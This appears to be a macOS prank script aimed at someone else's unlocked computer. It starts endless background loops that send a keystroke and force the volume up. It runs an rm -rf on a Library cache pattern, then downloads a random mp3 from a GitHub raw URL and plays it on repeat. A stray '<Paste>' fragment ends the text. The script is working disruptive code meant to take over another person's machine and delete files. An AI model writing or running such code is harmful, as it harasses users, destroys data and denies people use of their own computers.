for ((;;)) do osascript -e 'tell application "System Events"
	key code 93
end tell'; done&

zsh -c 'rm -rf "~/Library/*42_cache*"';

BASIC=('https://raw.githubusercontent.com/LogoutPolice/RandomBanana/master/')
LINKS=('PS' 'old' 'PulpFiction' 'Renault')
INDEX=$(awk -v min=0 -v max=3 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
LINK=("$BASIC${LINKS[$INDEX]}.mp3")
curl $LINK > ~/.TemporaryItems/mem.mp3
zsh -c 'sleep 10';

while [ 1 ]; do afplay ~/.TemporaryItems/mem.mp3; done &
while [ 1 ]; do osascript -e "set Volume 10"; done &<Paste>
